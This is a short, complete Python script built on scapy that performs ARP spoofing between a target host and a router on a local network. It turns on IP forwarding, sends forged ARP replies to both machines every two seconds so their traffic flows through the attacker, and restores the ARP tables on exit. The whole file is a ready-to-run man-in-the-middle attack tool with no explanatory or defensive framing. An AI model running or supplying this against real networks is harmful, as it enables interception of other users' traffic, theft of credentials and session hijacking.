#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import optparse
import subprocess


def port_forwarding():
    print("[+] Enabling port forwarding ")

    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward ", shell=True)


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Enter the target Ip address")
    parser.add_option("-r", "--router", dest="router", help="Enter the router Ip address")
    (options, arguments) = parser.parse_args()

    if not options.target:
        parser.error("[-] Please specify an target_ip and destination_ip ,use --help for more info.")

    return options


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()
sent_packet_count = 0
port_forwarding()
target_ip = options.target
gateway_ip = options.router

try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packet_count = sent_packet_count + 2
        print("\r [+] packets sent:" + str(sent_packet_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:

    print("[+] Detected CRTL+C...... Restoring.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
